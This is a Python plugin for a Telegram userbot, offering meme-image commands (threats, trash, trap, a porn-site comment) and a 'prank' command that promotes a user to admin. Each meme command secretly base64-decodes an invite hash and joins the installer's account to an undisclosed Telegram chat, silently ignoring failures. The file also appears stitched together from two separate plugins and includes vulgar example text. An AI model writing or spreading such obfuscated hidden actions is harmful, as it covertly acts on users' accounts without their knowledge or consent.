"""
credits to @mrconfused and @sandy1709
"""
# Kang with credits. Using in ULTRONBOT...
#    Copyright (C) 2020  sandeep.n(π.$)
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#   You should have received a copy of the GNU Affero General Public License
#   along with this program.  If not, see <http://www.gnu.org/licenses/>.

import base64
import os

from telegraph import exceptions, upload_file
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from userbot import CMD_HELP
from userbot.helpers.functions import (
    convert_toimage,
    deEmojify,
    phcomment,
    threats,
    trap,
    trash,
)
from ULTRONBOT.utils import admin_cmd, edit_or_reply, sudo_cmd
from userbot.cmdhelp import CmdHelp
from . import *


@bot.on(admin_cmd(pattern="threats(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern="threats(?: |$)(.*)", allow_sudo=True))
async def ULTRONBOT(ULTRONmemes):
    replied = await ULTRONmemes.get_reply_message()
    if not os.path.isdir("./temp/"):
        os.makedirs("./temp/")
    if not replied:
        await edit_or_reply(
            ULTRONmemes, "`Media file not supported. Reply to a supported media`"
        )
        return
    if replied.media:
        ULTRONmemmes = await edit_or_reply(ULTRONmemes, "`Detecting Threats.........`")
    else:
        await edit_or_reply(
            ULTRONmemes, "`Media file not supported. Reply to a suported media`"
        )
        return
    try:
        ULTRON = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        ULTRON = Get(ULTRON)
        await ULTRONmemes.client(ULTRON)
    except BaseException:
        pass
    download_location = await ULTRONmemes.client.download_media(replied, "./temp/")
    if download_location.endswith((".webp")):
        download_location = convert_toimage(download_location)
    size = os.stat(download_location).st_size
    if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
        if size > 5242880:
            await ULTRONmemmes.edit(
                "`The replied file is not supported. It should be less than 5mb -_-`"
            )
            os.remove(download_location)
            return
        await ULTRONmemmes.edit("`Detected Threats....`")
    else:
        await ULTRONmemmes.edit("`the replied file is not supported`")
        os.remove(download_location)
        return
    try:
        response = upload_file(download_location)
        os.remove(download_location)
    except exceptions.TelegraphException as exc:
        await ULTRONmemmes.edit("ERROR: " + str(exc))
        os.remove(download_location)
        return
    ULTRON = f"https://telegra.ph{response[0]}"
    ULTRON = await threats(ULTRON)
    await ULTRONmemmes.delete()
    await ULTRONmemes.client.send_file(ULTRONmemes.chat_id, ULTRON, reply_to=replied)


@bot.on(admin_cmd(pattern="trash(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern="trash(?: |$)(.*)", allow_sudo=True))
async def ULTRONBOT(ULTRONmemes):
    replied = await ULTRONmemes.get_reply_message()
    if not os.path.isdir("./temp/"):
        os.makedirs("./temp/")
    if not replied:
        await edit_or_reply(
            ULTRONmemes, "`Media file not supported. Reply to a suported media`"
        )
        return
    if replied.media:
        ULTRONmemmes = await edit_or_reply(ULTRONmemes, "`Detecting Trash....`")
    else:
        await edit_or_reply(
            ULTRONmemes, "`Media file not supported. Reply to a suported media`"
        )
        return
    try:
        ULTRON = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        ULTRON = Get(ULTRON)
        await ULTRONmemes.client(ULTRON)
    except BaseException:
        pass
    download_location = await ULTRONmemes.client.download_media(replied, "./temp/")
    if download_location.endswith((".webp")):
        download_location = convert_toimage(download_location)
    size = os.stat(download_location).st_size
    if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
        if size > 5242880:
            await ULTRONmemmes.edit(
                "`The replied file is not suported. Its size should be less than 5mb-_-`"
            )
            os.remove(download_location)
            return
        await ULTRONmemmes.edit("`Detected Trash.....`")
    else:
        await ULTRONmemmes.edit("Media file not supported. Reply to a suported media")
        os.remove(download_location)
        return
    try:
        response = upload_file(download_location)
        os.remove(download_location)
    except exceptions.TelegraphException as exc:
        await ULTRONmemmes.edit("ERROR: " + str(exc))
        os.remove(download_location)
        return
    ULTRON = f"https://telegra.ph{response[0]}"
    ULTRON = await trash(ULTRON)
    await ULTRONmemmes.delete()
    await ULTRONmemes.client.send_file(ULTRONmemes.chat_id, ULTRON, reply_to=replied)


@bot.on(admin_cmd(pattern="trap(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern="trap(?: |$)(.*)", allow_sudo=True))
async def ULTRONBOT(ULTRONmemes):
    input_str = ULTRONmemes.pattern_match.group(1)
    input_str = deEmojify(input_str)
    if "-" in input_str:
        text1, text2 = input_str.split("-")
    else:
        await edit_or_reply(
            ULTRONmemes,
            "**Command :** Reply to image or sticker with `.trap (name of the person to trap)-(trapper name)`",
        )
        return
    replied = await ULTRONmemes.get_reply_message()
    if not os.path.isdir("./temp/"):
        os.makedirs("./temp/")
    if not replied:
        await edit_or_reply(
            ULTRONmemes, "Media file not supported. Reply to a suported media"
        )
        return
    if replied.media:
        ULTRONmemmes = await edit_or_reply(ULTRONmemes, "`Trapping.....`")
    else:
        await edit_or_reply(
            ULTRONmemes, "Media file not supported. Reply to a suported media"
        )
        return
    try:
        ULTRON = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        ULTRON = Get(ULTRON)
        await ULTRONmemes.client(ULTRON)
    except BaseException:
        pass
    download_location = await ULTRONmemes.client.download_media(replied, "./temp/")
    if download_location.endswith((".webp")):
        download_location = convert_toimage(download_location)
    size = os.stat(download_location).st_size
    if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
        if size > 5242880:
            await ULTRONmemmes.edit(
                "the replied file size is not supported it must me below 5 mb"
            )
            os.remove(download_location)
            return
        await ULTRONmemmes.edit("`Trapped...`")
    else:
        await ULTRONmemmes.edit("Media file not supported. Reply to a suported media")
        os.remove(download_location)
        return
    try:
        response = upload_file(download_location)
        os.remove(download_location)
    except exceptions.TelegraphException as exc:
        await ULTRONmemmes.edit("ERROR: " + str(exc))
        os.remove(download_location)
        return
    ULTRON = f"https://telegra.ph{response[0]}"
    ULTRON = await trap(text1, text2, ULTRON)
    await ULTRONmemmes.delete()
    await ULTRONmemes.client.send_file(ULTRONmemes.chat_id, ULTRON, reply_to=replied)


@bot.on(admin_cmd(pattern="phc(?: |$)(.*)"))
@bot.on(sudo_cmd(pattern="phc(?: |$)(.*)", allow_sudo=True))
async def ULTRONBOT(ULTRONmemes):
    input_str = ULTRONmemes.pattern_match.group(1)
    input_str = deEmojify(input_str)
    if "-" in input_str:
        username, text = input_str.split("-")
    else:
        await edit_or_reply(
            ULTRONmemes,
            "**Command :** reply to image or sticker with `.phc (username)-(text in comment)`",
        )
        return
    replied = await ULTRONmemes.get_reply_message()
    if not os.path.isdir("./temp/"):
        os.makedirs("./temp/")
    if not replied:
        await edit_or_reply(
            ULTRONmemes, "Media file not supported. Reply to a suported media"
        )
        return
    if replied.media:
        ULTRONmemmes = await edit_or_reply(ULTRONmemes, "`Making A Comment`.")
    else:
        await edit_or_reply(
            ULTRONmemes, "Media file not supported. Reply to a suported media"
        )
        return
    try:
        ULTRON = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        ULTRON = Get(ULTRON)
        await ULTRONmemes.client(ULTRON)
    except BaseException:
        pass
    download_location = await ULTRONmemes.client.download_media(replied, "./temp/")
    if download_location.endswith((".webp")):
        download_location = convert_toimage(download_location)
    size = os.stat(download_location).st_size
    if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
        if size > 5242880:
            await ULTRONmemmes.edit(
                "the replied file size is not supported it must me below 5 mb"
            )
            os.remove(download_location)
            return
        await ULTRONmemmes.edit("Commented....")
    else:
        await ULTRONmemmes.edit("Media file not supported. Reply to a suported media")
        os.remove(download_location)
        return
    try:
        response = upload_file(download_location)
        os.remove(download_location)
    except exceptions.TelegraphException as exc:
        await ULTRONmemmes.edit("ERROR: " + str(exc))
        os.remove(download_location)
        return
    ULTRON = f"https://telegra.ph{response[0]}"
    ULTRON = await phcomment(ULTRON, text, username)
    await ULTRONmemmes.delete()
    await ULTRONmemes.client.send_file(ULTRONmemes.chat_id, ULTRON, reply_to=replied)

    
    
    import logging

logging.basicConfig(
    format="[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s", level=logging.WARNING
)
from datetime import datetime

from telethon.tl.functions.channels import EditAdminRequest
from telethon.tl.types import ChatAdminRights

from userbot.utils import admin_cmd


@borg.on(admin_cmd(pattern="prank ?(.*)"))
async def _(event):
    if event.fwd_from:
        return
    datetime.now()
    to_promote_id = None
    rights = ChatAdminRights(post_messages=True)
    input_str = event.pattern_match.group(1)
    reply_msg_id = event.message.id
    if reply_msg_id:
        r_mesg = await event.get_reply_message()
        to_promote_id = r_mesg.sender_id
    elif input_str:
        to_promote_id = input_str
    try:
        await borg(EditAdminRequest(event.chat_id, to_promote_id, rights, ""))
    except (Exception) as exc:
        await event.edit(str(exc))
    else:
        await event.edit("Successfully Promoted")

    
    
    
    
    
    
CmdHelp("prank").add_command(
  "phc", "<reply to img> <name> - <comment>", "Changes the given pic to dp and shows a comment in phub with the given name", "<reply to img/stcr> .phc NAME - hello PHUB"
).add_command(
  "trap", "<reply to img/stcr> <victim name> - <trapper name>", "Changes the given pic to another pic which shows that pic content is trapped in trap card", "<reply to img/stcr> .trap Loda - Lassan"
).add_command(
  "trash", "<reply to image/sticker>", "Changes the given pic to another pic which shows that pic content is as equal as to trash(waste)"
).add_command(
  "threats", "<reply to image/sticker>", "Changes the given pic to another pic which shows that pic content is threat to society as that of nuclear bomb"
).add_command(
  "prank", None, " Its prank promote.If this module doesn't work then contact admins in @Legend_Support"
).add()
